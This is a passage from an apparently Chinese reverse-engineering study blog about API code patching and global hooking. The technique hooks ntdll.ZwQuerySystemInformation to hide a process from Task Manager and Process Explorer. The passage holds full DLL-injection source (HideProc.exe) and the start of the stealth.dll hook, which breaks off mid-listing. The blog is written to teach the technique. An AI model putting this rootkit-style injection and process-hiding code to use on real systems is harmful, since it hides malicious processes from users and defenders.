class="keyword">if</span>(!_tcsicmp(argv[<span class="number">1</span>], <span class="string">L&quot;e&quot;</span>) )</span><br><span class="line">        <span class="built_in">EjectDll</span>((DWORD)_tstoi(argv[<span class="number">2</span>]), argv[<span class="number">3</span>]);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="0x04-隐藏进程"><a href="#0x04-隐藏进程" class="headerlink" title="0x04 隐藏进程"></a>0x04 隐藏进程</h2><p>&emsp;本节介绍：<strong>（1）通过修改API代码(Code Patch)实现API钩取的技术；（2）全局钩取(Global hooking)，它能钩取所有进程；（3）使用全局钩取隐藏(Stealth)特定进程。</strong></p>
<p>&emsp;相关技术图表如下：</p>
<p><img src="/images/re-core-principle-3/image-20230414154605820.png" alt="image-20230414154605820" style="zoom:50%;" /></p>
<p>&emsp;0x03中，介绍了 IAT 钩取技术，如果要钩取的 API不在进程的 IAT中，那么就无法使用该技术，而 API code patch 没有这一限制。</p>
<h3 id="API-code-patch-原理："><a href="#API-code-patch-原理：" class="headerlink" title="API code patch 原理："></a>API code patch 原理：</h3><p>&emsp;<strong>IAT钩取通过操作进程的特定IAT值来实现API钩取，而API代码修改技术则将API代码的前5个字节修改为<code>JMP XXXXXXXX</code>指来钩取API。调用执行被钩取的API时，(修改后的)<code>JMP XXXXXXXX</code>指令就会被执行，从而转到hooking函数。</strong></p>
<p>&emsp;钩取之前正常调用的API：</p>
<p><img src="/images/re-core-principle-3/image-20230414155107840.png" alt="image-20230414155107840" style="zoom:50%;" /></p>
<p>&emsp;钩取之后调用API的流程如下（<code>procexp.exe</code>注入<code>stealth.dll</code>文件后，钩取<code>ntdll.ZwQuerySystemInformation()</code>的整个过程。<code>ntdll.ZwQuerySystemInformation</code>是为了隐藏进程而需要钩取的API）：</p>
<p><img src="/images/re-core-principle-3/image-20230414155229093.png" alt="image-20230414155229093" style="zoom:50%;" /></p>
<p>&emsp;上图过程的详细解释如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">首先，把stealth.dll注入目标进程，钩取ntdll.ZwQuerySystemInformation。ntdll.ZwQuerySystemInformation起始地址(7C93D92E)的5个字节代码被修改为JMP 10001120(仅修改5个字节代码)。10001120是stealth.MyZwOuerySystemInformation函数的地址。此时，在procexp.exe代码中调用ntd11ZwQuerySystemInformation，程序将按如下顺序执行：</span><br><span class="line">（1）在422CF7地址处调用ntdll.ZwQuerySystemInformation</span><br><span class="line">（2）位于7C93D92E地址处的(修改后的)JMP 10001120指令将执行流转到10001120地址处(hooking函数)。1000116A地址处的CALL unhook指令用来将ntdl.ZwOuerySystemInformation的起始5个字节恢复原值。</span><br><span class="line">（3）位于1000119B地址处的CALL EAX(7C93D92E)指将调用原来的函数(ntdll.ZwOuerySystemInformation)。</span><br><span class="line">（4）ntdll.ZwQuerySystemInformation执行完毕后，由7C93D93A地址处的RETN10指令返回到stealth.dll代码区域(调用自身的位置)。然后10001212地址处的CALL hook指令再次钩取ntdll.ZwQuerySystemInformation。</span><br><span class="line">（5）stealth.MyZwQuerySystemInformation函数执行完毕后，由10001233地址处的RETN10命令返回到procexp.exe进程的代码区域，继续执行。</span><br></pre></td></tr></table></figure>
<p>&emsp;API code patch可以钩取任意API，而IAT钩取只能钩取表中有的API。</p>
<p><strong>注：API code patch就是指直接修改映射到目标进程内存空间的系统 DLL的代码。但是，进程的其他线程正在读(read)某个函数时，尝试修改其代码会怎么样呢?这样做会引发非法访问(Access Violation)异常。</strong></p>
<h3 id="进程隐藏原理："><a href="#进程隐藏原理：" class="headerlink" title="进程隐藏原理："></a>进程隐藏原理：</h3><p>&emsp;隐形战机是在自身进行喷涂，使得雷达无法检测到。<strong>而进程隐藏则是：要潜入其他所有进程内存，钩取相关API。</strong>也就是说，把所有人的雷达都干掉。</p>
<p>&emsp;一般来说，进程可以通过一些API检测到其他的进程，这些API有：<code>CreateToolhelp32Snapshot</code>，<code>EnumProcess</code>。这两个API在内部都调用了<code>ntdll.ZwQuerySystemInformation</code>。因此，借助此API就可以获得运行中所有进程的信息，形成一个列表，操作该列表（删除某条目）即可隐藏相关进程。<strong>注意，我们要钩取的目标进程不是要隐藏的进程，而是其他所有的进程。</strong></p>
<p>&emsp;假如我们要隐藏的进程为<code>test.exe</code>，如果钩取运行中的<code>ProExp.exe</code>（进程查看器）(或者任务管理器<code>taskmgr.exe</code>)进程的<code>ZwQuerySystemInformation</code>，那么<code>ProcExp.exe</code>就无法查找到<code>test.exe</code>。这种方法存在两个问题：<strong>（1）不是只有<code>ProExp.exe</code>才能查看要运行的进程，我们只钩取了一个。（2）如果新开一个<code>ProExp.exe</code>，新开的<code>ProExp.exe</code>能够查看我们想要隐藏的进程。</strong>为了解决上述问题？我们要对运行中的所有进程都要进行钩取，并且对后面要启动的进程也要做钩取操作。</p>
<h3 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h3><p>&emsp;<code>HideProc.exe</code>负责将<code>stealth.dll</code>文件注入所有运行中的进程。<code>stealth.dll</code>负责钩取进程的<code>ntdll.ZwQuerySystemInformation</code>。需要说明的是，上述文件不能解决全局钩取的问题，因此这是一种不完全隐藏技术。具体过程在P334页，跟着做就好。</p>
<p><strong>HideProc.exe 源代码如下：</strong></p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;windows.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdio.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;tlhelp32.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;tchar.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">void</span> <span class="params">(*PFN_SetProcName)</span><span class="params">(LPCTSTR szProcName)</span></span>;</span><br><span class="line"><span class="keyword">enum</span> &#123;INJECTION_MODE = <span class="number">0</span>, EJECTION_MODE&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">SetPrivilege</span><span class="params">(LPCTSTR lpszPrivilege, BOOL bEnablePrivilege)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">InjectDll</span><span class="params">(DWORD dwPID, LPCTSTR szDllPath)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	HANDLE                  hProcess, hThread;</span><br><span class="line">	LPVOID                  pRemoteBuf;</span><br><span class="line">	DWORD                   dwBufSize = (DWORD)(_tcslen(szDllPath) + <span class="number">1</span>) * <span class="built_in">sizeof</span>(TCHAR);</span><br><span class="line">	LPTHREAD_START_ROUTINE  pThreadProc;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> ( !(hProcess = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, dwPID)) )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;OpenProcess(%d) failed!!!\n&quot;</span>, dwPID);</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">	pRemoteBuf = <span class="built_in">VirtualAllocEx</span>(hProcess, <span class="literal">NULL</span>, dwBufSize, </span><br><span class="line">                                MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">WriteProcessMemory</span>(hProcess, pRemoteBuf, </span><br><span class="line">                       (LPVOID)szDllPath, dwBufSize, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	pThreadProc = (LPTHREAD_START_ROUTINE)</span><br><span class="line">                  <span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandle</span>(<span class="string">L&quot;kernel32.dll&quot;</span>), </span><br><span class="line">                                 <span class="string">&quot;LoadLibraryW&quot;</span>);</span><br><span class="line">	hThread = <span class="built_in">CreateRemoteThread</span>(hProcess, <span class="literal">NULL</span>, <span class="number">0</span>, </span><br><span class="line">                                 pThreadProc, pRemoteBuf, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="built_in">WaitForSingleObject</span>(hThread, INFINITE);	</span><br><span class="line"></span><br><span class="line">	<span class="built_in">VirtualFreeEx</span>(hProcess, pRemoteBuf, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">CloseHandle</span>(hThread);</span><br><span class="line">	<span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">EjectDll</span><span class="params">(DWORD dwPID, LPCTSTR szDllPath)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	BOOL                    bMore = FALSE, bFound = FALSE;</span><br><span class="line">	HANDLE                  hSnapshot, hProcess, hThread;</span><br><span class="line">	MODULEENTRY32           me = &#123; <span class="built_in">sizeof</span>(me) &#125;;</span><br><span class="line">	LPTHREAD_START_ROUTINE  pThreadProc;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>( INVALID_HANDLE_VALUE == </span><br><span class="line">        (hSnapshot = <span class="built_in">CreateToolhelp32Snapshot</span>(TH32CS_SNAPMODULE, dwPID)) )</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line"></span><br><span class="line">	bMore = <span class="built_in">Module32First</span>(hSnapshot, &amp;me);</span><br><span class="line">	<span class="keyword">for</span>( ; bMore ; bMore = <span class="built_in">Module32Next</span>(hSnapshot, &amp;me) )</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span>( !_tcsicmp(me.szModule, szDllPath) || </span><br><span class="line">            !_tcsicmp(me.szExePath, szDllPath) )</span><br><span class="line">		&#123;</span><br><span class="line">			bFound = TRUE;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>( !bFound )</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">CloseHandle</span>(hSnapshot);</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>( !(hProcess = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, dwPID)) )</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">CloseHandle</span>(hSnapshot);</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	pThreadProc = (LPTHREAD_START_ROUTINE)</span><br><span class="line">                  <span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandle</span>(<span class="string">L&quot;kernel32.dll&quot;</span>), </span><br><span class="line">                                 <span class="string">&quot;FreeLibrary&quot;</span>);</span><br><span class="line">	hThread = <span class="built_in">CreateRemoteThread</span>(hProcess, <span class="literal">NULL</span>, <span class="number">0</span>, </span><br><span class="line">                                 pThreadProc, me.modBaseAddr, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="built_in">WaitForSingleObject</span>(hThread, INFINITE);	</span><br><span class="line"></span><br><span class="line">	<span class="built_in">CloseHandle</span>(hThread);</span><br><span class="line">	<span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line">	<span class="built_in">CloseHandle</span>(hSnapshot);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">InjectAllProcess</span><span class="params">(<span class="type">int</span> nMode, LPCTSTR szDllPath)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	DWORD                   dwPID = <span class="number">0</span>;</span><br><span class="line">	HANDLE                  hSnapShot = INVALID_HANDLE_VALUE;</span><br><span class="line">	PROCESSENTRY32          pe;</span><br><span class="line">	BOOL ret;</span><br><span class="line">	<span class="comment">// Get the snapshot of the system</span></span><br><span class="line">	pe.dwSize = <span class="built_in">sizeof</span>( PROCESSENTRY32 );</span><br><span class="line">	hSnapShot = <span class="built_in">CreateToolhelp32Snapshot</span>( TH32CS_SNAPALL, <span class="literal">NULL</span> );</span><br><span class="line"></span><br><span class="line">	<span class="comment">// find process</span></span><br><span class="line">	<span class="built_in">Process32First</span>(hSnapShot, &amp;pe);</span><br><span class="line">	<span class="keyword">do</span></span><br><span class="line">	&#123;</span><br><span class="line">		dwPID = pe.th32ProcessID;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 对于PID小于100的进程，不进行注入</span></span><br><span class="line">		<span class="keyword">if</span>( dwPID &lt; <span class="number">1000</span> )</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>( nMode == INJECTION_MODE )</span><br><span class="line">		    ret = <span class="built_in">InjectDll</span>(dwPID, szDllPath);</span><br><span class="line">			<span class="keyword">if</span>(ret)</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;OpenProcess(%d) success!!!\n&quot;</span>, dwPID);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="built_in">EjectDll</span>(dwPID, szDllPath);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">while</span>( <span class="built_in">Process32Next</span>(hSnapShot, &amp;pe) );</span><br><span class="line"></span><br><span class="line">	<span class="built_in">CloseHandle</span>(hSnapShot);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> _tmain(<span class="type">int</span> argc, TCHAR* argv[])</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span>                     nMode = INJECTION_MODE;</span><br><span class="line">    HMODULE                 hLib = <span class="literal">NULL</span>;</span><br><span class="line">    PFN_SetProcName         SetProcName = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>( argc != <span class="number">4</span> )</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;\n Usage  : HideProc.exe &lt;-hide|-show&gt; &quot;</span>\</span><br><span class="line">               <span class="string">&quot;&lt;process name&gt; &lt;dll path&gt;\n\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// change privilege</span></span><br><span class="line">    <span class="built_in">SetPrivilege</span>(SE_DEBUG_NAME, TRUE);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// load library</span></span><br><span class="line">    <span class="comment">// stealth.dll</span></span><br><span class="line">    hLib = <span class="built_in">LoadLibrary</span>(argv[<span class="number">3</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// set process name to hide</span></span><br><span class="line">    <span class="comment">// notepad.exe</span></span><br><span class="line">    SetProcName = (PFN_SetProcName)<span class="built_in">GetProcAddress</span>(hLib, <span class="string">&quot;SetProcName&quot;</span>);</span><br><span class="line">    <span class="built_in">SetProcName</span>(argv[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Inject(Eject) Dll to all process</span></span><br><span class="line">    <span class="keyword">if</span>( !_tcsicmp(argv[<span class="number">1</span>], <span class="string">L&quot;-show&quot;</span>) )</span><br><span class="line">	    nMode = EJECTION_MODE;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">InjectAllProcess</span>(nMode, argv[<span class="number">3</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// free library</span></span><br><span class="line">    <span class="built_in">FreeLibrary</span>(hLib);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>&emsp;在说明<code>stealth.dll</code>之前，由于钩取了<code>ntdll.ZwQuerySystemlnformation</code>的API，因此，我们要先了解这个API。</p>
<p><img src="/images/re-core-principle-3/image-20230414225318976.png" alt="image-20230414225318976" style="zoom:50%;" /></p>
<p>&emsp;简单讲解：<strong>将<code>SystemInformationClass</code>参数设置为<code>SystemProcessInformation</code>后调用<code>ZwQuerySystemInformation</code>，<code>SystemInformation [in/out]</code>参数中存储的是<code>SYSTEM_PROCESS_INFORMATION</code>结构体单向链表（sigle linked list）的起始地址。该结构体链表中存储着运行中的所有进程的信息。所以，隐藏某进程前，先要查找与之对应的链表成员，然后断开其与链表的链接。</strong></p>
<p>&emsp;<strong>下面是<code>stealth.dll</code>的代码：</strong></p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// stealth.cpp -&gt; stealth.dll</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;windows.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;tchar.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STATUS_SUCCESS						(0x00000000L) </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> LONG NTSTATUS;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">enum</span> <span class="title class_">_SYSTEM_INFORMATION_CLASS</span> &#123;</span><br><span class="line">    SystemBasicInformation = <span class="number">0</span>,</span><br><span class="line">    SystemPerformanceInformation = <span class="number">2</span>,</span><br><span class="line">    SystemTimeOfDayInformation = <span class="number">3</span>,</span><br><span class="line">    SystemProcessInformation = <span class="number">5</span>,</span><br><span class="line">    SystemProcessorPerformanceInformation = <span class="number">8</span>,</span><br><span class="line">    SystemInterruptInformation = <span class="number">23</span>,</span><br><span class="line">    SystemExceptionInformation = <span class="number">33</span>,</span><br><span class="line">    SystemRegistryQuotaInformation = <span class="number">37</span>,</span><br><span class="line">    SystemLookasideInformation = <span class="number">45</span></span><br><span class="line">&#125; SYSTEM_INFORMATION_CLASS;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_SYSTEM_PROCESS_INFORMATION</span> &#123;</span><br><span class="line">    ULONG NextEntryOffset;</span><br><span class="line">    ULONG NumberOfThreads;</span><br><span class="line">    BYTE Reserved1[<span class="number">48</span>];</span><br><span class="line">    PVOID Reserved2[<span class="number">3</span>];</span><br><span class="line">    HANDLE UniqueProcessId;</span><br><span class="line">    PVOID Reserved3;</span><br><span class="line">    ULONG HandleCount;</span><br><span class="line">    BYTE Reserved4[<span class="number">4</span>];</span><br><span class="line">    PVOID Reserved5[<span class="number">11</span>];</span><br><span class="line">    SIZE_T PeakPagefileUsage;</span><br><span class="line">    SIZE_T PrivatePageCount;</span><br><span class="line">    LARGE_INTEGER Reserved6[<span class="number">6</span>];</span><br><span class="line">&#125; SYSTEM_PROCESS_INFORMATION, *PSYSTEM_PROCESS_INFORMATION;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">NTSTATUS</span> <span class="params">(WINAPI *PFZWQUERYSYSTEMINFORMATION)</span></span></span><br><span class="line"><span class="function">                 <span class="params">(SYSTEM_INFORMATION_CLASS SystemInformationClass, </span></span></span><br><span class="line"><span class="params"><span class="function">                  PVOID SystemInformation, </span></span></span><br><span class="line"><span class="params"><span class="function">                  ULONG SystemInformationLength, </span></span></span><br><span class="line"><span class="params"><span class="function">                  PULONG ReturnLength)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEF_NTDLL                       (<span class="string">&quot;ntdll.dll&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEF_ZWQUERYSYSTEMINFORMATION    (<span class="string">&quot;ZwQuerySystemInformation&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// global variable (in sharing memory)</span></span><br><span class="line"><span class="comment">// 告诉编译器将代码中的一个特定的段（segment）链接到一个名为</span></span><br><span class="line"><span class="comment">// SHARE的可读写共享内存段（shared memory segment）中。</span></span><br><span class="line"><span class="comment">// 这个共享内存段可以被不同的进程访问，从而实现进程间通信。</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(linker, <span class="string">&quot;/SECTION:.SHARE,RWS&quot;</span>)</span></span><br><span class="line"><span 